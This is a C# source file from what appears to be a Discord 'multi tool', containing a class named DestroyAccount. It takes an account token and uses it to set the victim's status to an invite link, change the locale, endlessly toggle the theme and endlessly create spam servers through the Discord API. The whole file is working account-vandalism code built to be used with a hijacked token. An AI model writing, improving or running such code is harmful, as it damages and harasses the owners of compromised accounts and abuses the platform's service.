using System;
using System.Net;
using System.Threading;

namespace Unix_Coding_Discord_Multi_Tool.functions
{
    class DestroyAccount
    {
        public static void Start()
        {
            Console.Write("Token: ");

            var token = Console.ReadLine();

            Basic(token);

            SpamLightmode(token);

            CreateServers(token);
        }

        public static void Basic(string token)
        {
            new Thread(() =>
            {
                try
                {
                    using(var wClient = new WebClient())
                    {
                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString("https://discord.com/api/v8/users/@me/settings", "PATCH", @"{""custom_status"":{""text"":""Join: https://discord.gg/tEVQA8zHNZ""}}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString("https://discord.com/api/v8/users/@me/settings", "PATCH", @"{""locale"": ""ko""}");

                        Console.ForegroundColor = ConsoleColor.DarkCyan;

                        Console.WriteLine("[Unix] Successfully completed basics\n");
                    }
                }
                catch(Exception)
                {
                    Console.ForegroundColor = ConsoleColor.Red;

                    Console.WriteLine("[Unix] There was an error while completing basics\n");
                }
            }).Start();
        }

        public static void SpamLightmode(string token)
        {
            new Thread(() =>
            {
                while(true)
                {
                    try
                    {
                        using(var wClient = new WebClient())
                        {
                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/users/@me/settings", "PATCH", @"{""theme"": ""light""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/users/@me/settings", "PATCH", @"{""theme"": ""dark""}");

                            Console.ForegroundColor = ConsoleColor.DarkCyan;

                            Console.WriteLine("[Unix] Successfully spammed Lightmode / Darkmode\n");
                        }
                    }
                    catch(Exception)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;

                        Console.WriteLine("[Unix] There was an error while spamming Lightmode / Darkmode\n");
                    }
                }
            }).Start();
        }

        public static void CreateServers(string token)
        {
            new Thread(() =>
            {
                while(true)
                {
                    try
                    {
                        using(var wClient = new WebClient())
                        {
                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            wClient.Headers.Set("Authorization", token);
                            wClient.Headers.Set("Content-Type", "application/json");
                            wClient.UploadString("https://discord.com/api/v8/guilds", "POST", @"{""name"": ""Unix Coding"", ""icon"": null, ""channels"": [], ""system_channel_id"": null, ""guild_template_code"": ""2TffvPucqHkN""}");

                            Console.ForegroundColor = ConsoleColor.DarkCyan;

                            Console.WriteLine("[Unix] Successfully spam created server's\n");
                        }
                    }
                    catch(Exception)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;

                        Console.WriteLine("[Unix] There was an error while creating server's\n");
                    }
                }
            }).Start();
        }
    }
}